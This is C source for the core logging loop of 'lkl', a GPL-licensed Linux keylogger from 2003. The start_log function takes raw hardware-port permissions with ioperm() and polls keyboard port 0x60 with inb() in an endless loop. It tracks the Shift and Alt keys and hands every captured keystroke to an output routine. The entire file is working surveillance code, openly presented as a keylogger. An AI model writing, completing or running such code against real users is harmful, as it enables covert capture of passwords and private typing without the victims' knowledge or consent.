/*
    LinuxKeyLogger, lkl is a keylogger for x86-arch running under linux.
    Developed by vl4d

    Copyright (C) 2003  Carlo Comin

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
*/


/* Here is the core of lkl. start_log grabs everything that passes 
   trought the hardware keyboard port 0x60 using an iopl() for 
   permissions menagement and inb() for logging. Note that lkl logs
   datas if keyboard status(0x64 hardware port) is 0x14 only. 
*/

#include "lkl.h" 

void start_log(struct lkl *lkl)
{
	int pressed_shift, pressed_alt, status;
	unsigned char c, table[TABLE_SIZE];
  
	c = status = pressed_shift = pressed_alt = 0;
	bzero(table, TABLE_SIZE);

	if(ioperm(lkl->port, 1, 1) == -1){
	    perror("ioperm()");
	    exit(1);
	}

	if(ioperm(KEYBOARD_STATUS_PORT, 1, 1) == -1){
	    perror("ioperm()");
	    exit(1);
	}

	while(1){
		status = inb(KEYBOARD_STATUS_PORT);

		if(lkl->debug) fprintf(stderr, "c=%d ", c) ;

		if(status == 20) {
		    c = inb(lkl->port);    
		    if (c < TABLE_SIZE){
			if(table[c] != 1){
			    if((c == 42)	// LShift
			       || (c == 54))	// RShift
				lkl->pressed_shift = 1;

			    if(c == 56)		// LAlt, RAlt (dang!)
				lkl->pressed_alt = 1;

			    do_output(c, lkl);
			    fflush(0);
			}
			table[c] = 1;
		    }else{  
			if(lkl->debug) fprintf(stderr, "d=%d ", (c&127));
			table[c & 127] = 0; //&127 delete the pair bit

			if((table[42] == 0)     // LShift
			   && (table[54] == 0))	// RShift
			    lkl->pressed_shift = 0;
		    }
		}
		usleep(MSEC); //Don't freeze your system, dude :
	}
}
